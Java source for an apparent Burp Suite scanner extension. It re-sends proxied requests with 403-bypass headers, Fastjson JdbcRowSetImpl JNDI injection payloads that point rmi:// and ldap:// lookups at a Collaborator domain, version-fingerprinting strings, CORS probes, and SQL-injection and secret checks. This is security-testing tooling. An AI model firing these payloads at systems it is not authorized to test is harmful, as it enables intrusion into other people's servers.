import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.*;
import burp.api.montoya.http.handler.*;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;

import java.net.MalformedURLException;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;

public class MyHttpHandler implements HttpHandler {
    private final MontoyaApi montoyaApi;
    private final MyTableModel tableModel;
    private final ConfigModel configModel;

    private final AtomicInteger id = new AtomicInteger(1);  //原子类
    private final ExecutorService threadPool = Executors.newFixedThreadPool(10);

    private final List<String> fastjsonPayload = List.of(
            "{\"axin\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"is\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://fast.%s/aaa\",\"autoCommit\":true}}",
            "{\"handsome\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://fast.%s/aaa\",\"autoCommit\":true}}",
            "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://fast.%s/aaa\",\"autoCommit\":true}"
    );
    private final List<String> fastjsonPayloadError = List.of(
            "{\"@type\": \"java.lang.AutoCloseable\"",
            "[\"test\":1]"
    );

    public MyHttpHandler(MontoyaApi montoyaApi, MyTableModel tableModel, ConfigModel configModel) {
        this.montoyaApi = montoyaApi;
        this.tableModel = tableModel;
        this.configModel = configModel;
    }

    @Override
    public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent requestToBeSent) {
        return RequestToBeSentAction.continueWith(requestToBeSent);
    }

    @Override
    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived) {
        boolean bypass403Enabled = configModel.isBypass403Enabled();
        boolean fastjsonEnabled = configModel.isFastjsonEnabled();
        boolean springbootEnabled = configModel.isspringbootEnabled();
        boolean corsEnabled = configModel.isCorsEnabled();
        boolean juniorSqlEnabled = configModel.isJuniorSqlEnabled();
        boolean findSecretEnabled = configModel.isFindSecretEnabled();

        if (bypass403Enabled) {
            submitTask(() -> handleBypass403VulnerabilityDetection(responseReceived));
        }

        if (fastjsonEnabled) {
            submitTask(() -> handleFastJsonVulnerabilityDetection(responseReceived));
        }

        if (springbootEnabled) {
            submitTask(() -> handleSpringBootVulnerabilityDetection(responseReceived));
        }

        if (corsEnabled) {
            submitTask(() -> handleCorsDetection(responseReceived));
        }

        if (juniorSqlEnabled) {
            submitTask(() -> handleSQLInjectionVulnerabilityDetection(responseReceived));
        }

        if (findSecretEnabled) {
            submitTask(() -> handleFindSecretVulnerabilityDetection(responseReceived));
        }


        return null;
    }

    private void handleBypass403VulnerabilityDetection(HttpResponseReceived responseReceived) {
        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
            handleBypass403(responseReceived);
        }
    }

    private void handleBypass403(HttpResponseReceived responseReceived) {
        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
            HttpRequest firstHttpRequest = responseReceived.initiatingRequest();
            HttpResponse firstResponse = montoyaApi.http().sendRequest(firstHttpRequest).response();
            if (firstResponse.statusCode() == 403) {
                int firstLength = firstResponse.body().length();
                HttpRequest modifiedRequest = firstHttpRequest
                        .withAddedHeader("X-Forwarded-For", "127.0.0.1")
                        .withAddedHeader("X-Originating-IP", "127.0.0.1")
                        .withAddedHeader("X-Remote-IP", "127.0.0.1")
                        .withAddedHeader("X-Remote-Addr", "127.0.0.1")
                        .withAddedHeader("X-Forwarded-Proto", "http")
                        .withAddedHeader("X-Forwarded-Host", "127.0.0.1");

                HttpResponse twiceResponse = montoyaApi.http().sendRequest(modifiedRequest).response();

                int twiceLength = twiceResponse.body().length();

                if (twiceLength != firstLength && twiceResponse.statusCode() != 403) {
                    tableModel.add(new SourceLogEntry(
                            id.getAndIncrement(),
                            responseReceived.toolSource().toolType().toolName(),
                            null,
                            "403 bypass",
                            twiceLength,
                            HttpRequestResponse.httpRequestResponse(modifiedRequest, twiceResponse),
                            modifiedRequest.httpService().toString(),
                            responseReceived.initiatingRequest().pathWithoutQuery(),
                            twiceResponse.statusCode()
                    ));
                }
            }
        }
    }

    private void handleFastJsonVulnerabilityDetection(HttpResponseReceived responseReceived) {
        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
            HttpRequest initHttpRequest = responseReceived.initiatingRequest();
            String body = initHttpRequest.body().toString();
            if (body != null && body.length() > 0 && strMatch(body, "json")) {
                detectFastJsonVulnerability(initHttpRequest, responseReceived);
            }
        }
    }

    private void detectFastJsonVulnerability(HttpRequest initHttpRequest, HttpResponseReceived responseReceived) {
        CollaboratorClient collaboratorClient = montoyaApi.collaborator().createClient();

        for (String payload : fastjsonPayload) {
            String dnsDomain = collaboratorClient.generatePayload().toString();
            String formatPayload = String.format(payload, dnsDomain);
            HttpRequest modifiedRequest = initHttpRequest.withBody(formatPayload);
            HttpResponse modifiedResponse = montoyaApi.http().sendRequest(modifiedRequest).response();

            try {
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                montoyaApi.logging().logToOutput("FastJSON检测线程被中断：" + e.getMessage());
                return;
            }

            List<Interaction> interactions = collaboratorClient.getInteractions(InteractionFilter.interactionPayloadFilter(dnsDomain));
            if (interactions != null && !interactions.isEmpty()) {
                logVulnerability(
                        responseReceived,
                        modifiedRequest,
                        modifiedResponse,
                        "FastJson Vul"
                );
                return;
            }
        }

        for (String payloadError : fastjsonPayloadError) {
            HttpRequest modifiedRequest = initHttpRequest.withBody(payloadError);
            HttpResponse modifiedResponse = montoyaApi.http().sendRequest(modifiedRequest).response();

            if (modifiedResponse.bodyToString().contains("Version") || modifiedResponse.bodyToString().contains("1.2.")) {
                logVulnerability(
                        responseReceived,
                        modifiedRequest,
                        modifiedResponse,
                        "Find FastJson Version"
                );
                return;
            }
        }
    }

    private void handleSpringBootVulnerabilityDetection(HttpResponseReceived responseReceived) {
        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
            detectSpringBootVulnerability(responseReceived);
        }
    }

    private void detectSpringBootVulnerability(HttpResponseReceived responseReceived) {
        HttpRequest httpRequest = responseReceived.initiatingRequest();
        String url = httpRequest.url();
        try {
            java.net.URL parsedUrl = new java.net.URL(url);
            int port = parsedUrl.getPort();
            String baseUrl = port == -1
                    ? parsedUrl.getProtocol() + "://" + parsedUrl.getHost() + "/"
                    : parsedUrl.getProtocol() + "://" + parsedUrl.getHost() + ":" + port + "/";

            SpringBootScan springBootScan = new SpringBootScan(baseUrl, httpRequest, montoyaApi);
            boolean isIcoOfSpring = springBootScan.getIcoHash();
            boolean pathError = springBootScan.getPathError();

            if (isIcoOfSpring || pathError) {
                HashMap<HttpRequest, HttpResponse> pathRequestReponse = springBootScan.startPathScan();
                if (pathRequestReponse != null && !pathRequestReponse.isEmpty()) {
                    for (Map.Entry<HttpRequest, HttpResponse> entry : pathRequestReponse.entrySet()) {
                        HttpRequest request = entry.getKey();
                        HttpResponse response = entry.getValue();
                        logVulnerability(
                                responseReceived,
                                request,
                                response,
                                "Find SpringBoot Path"
                        );
                    }
                }
            }
        } catch (MalformedURLException | InterruptedException e) {
            montoyaApi.logging().logToOutput("SpringBoot检测发生错误：" + e.getMessage());
        }
    }

    private void handleCorsDetection(HttpResponseReceived responseReceived) {
        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
            handleCorsVulnerability(responseReceived);
        }
    }

    private void handleCorsVulnerability(HttpResponseReceived responseReceived) {
        HttpRequest corsHttpRequest = responseReceived.initiatingRequest().withHeader("Origin", "*");
        HttpResponse corsResponse = montoyaApi.http().sendRequest(corsHttpRequest).response();

        if (corsResponse.statusCode() == 200 &&
                corsResponse.hasHeader("Access-Control-Allow-Origin", "*") &&
                corsResponse.hasHeader("Access-Control-Allow-Credentials", "*")) {
            logVulnerability(
                    responseReceived,
                    corsHttpRequest,
                    corsResponse,
                    "CORS Vul"
            );
        }
    }

    private void handleSQLInjectionVulnerabilityDetection(HttpResponseReceived responseReceived) {
        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
            detectSQLInjectionVulnerability(responseReceived);
        }
    }

    private void detectSQLInjectionVulnerability(HttpResponseReceived responseReceived) {
        HttpRequest httpRequest = responseReceived.initiatingRequest();
        String baseUrl = httpRequest.url();

        try {
            JuniorSqlDetection juniorSqlDetection = new JuniorSqlDetection(baseUrl, httpRequest, montoyaApi);
            HashMap<HttpRequest, HttpResponse> sqlRequestResponse = juniorSqlDetection.SqlDetection();

            if (sqlRequestResponse != null && !sqlRequestResponse.isEmpty()) {
                for (Map.Entry<HttpRequest, HttpResponse> entry : sqlRequestResponse.entrySet()) {
                    HttpRequest request = entry.getKey();
                    HttpResponse response = entry.getValue();
                    String lengthDiff = getLengthDiff(request);
                    logVulnerability(
                            responseReceived,
                            request,
                            response,
                            "SQL ERROR, Len Change: " + lengthDiff
                    );
                }
            }
        } catch (InterruptedException e) {
            montoyaApi.logging().logToOutput("SQLInjection检测线程被中断：" + e.getMessage());
        }
    }

    private void logVulnerability(HttpResponseReceived responseReceived, HttpRequest request, HttpResponse response, String vulnerabilityType) {
        tableModel.add(new SourceLogEntry(
                id.getAndIncrement(),
                responseReceived.toolSource().toolType().toolName(),
                null,
                vulnerabilityType,
                response.body().length(),
                HttpRequestResponse.httpRequestResponse(request, response),
                request.httpService().toString(),
                responseReceived.initiatingRequest().pathWithoutQuery(),
                response.statusCode()
        ));
    }

    private void handleFindSecretVulnerabilityDetection(HttpResponseReceived responseReceived) {
        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
            FindSecretVulnerability(responseReceived);
        }
    }
    private void FindSecretVulnerability(HttpResponseReceived responseReceived) {
        HttpRequest firstHttpRequest = responseReceived.initiatingRequest();
        //String baseUrl = firstHttpRequest.url();
        FindSecret findSecret = new FindSecret();
        HttpResponse response = montoyaApi.http().sendRequest(firstHttpRequest).response();
        String responseBody = response.bodyToString();
        List<String> result = findSecret.detectSensitiveInfo(responseBody,montoyaApi);
        montoyaApi.logging().logToOutput(result.toString());
        if (result != null && !result.isEmpty()) {
            for (String sensitiveInfo : result) {
                logVulnerability(
                        responseReceived,
                        firstHttpRequest,
                        response,
                        "Sensitive Information Detected: " + sensitiveInfo
                );
            }
        }
    }

    private void submitTask(Runnable task) {
        threadPool.submit(task);
    }

    public static boolean strMatch(String str, String pattern) {
        if ("json".equals(pattern)) {
            return str.contains("{") && str.contains("}");
        }
        return false;
    }

    public static String getLengthDiff(HttpRequest request) {
        return request.headerValue("X-Length-Diff");
    }

    // 在程序结束时关闭线程池
    public void shutdown() {
        threadPool.shutdown();
        try {
            if (!threadPool.awaitTermination(5, TimeUnit.SECONDS)) {
                threadPool.shutdownNow();
            }
        } catch (InterruptedException e) {
            threadPool.shutdownNow();
        }
    }
}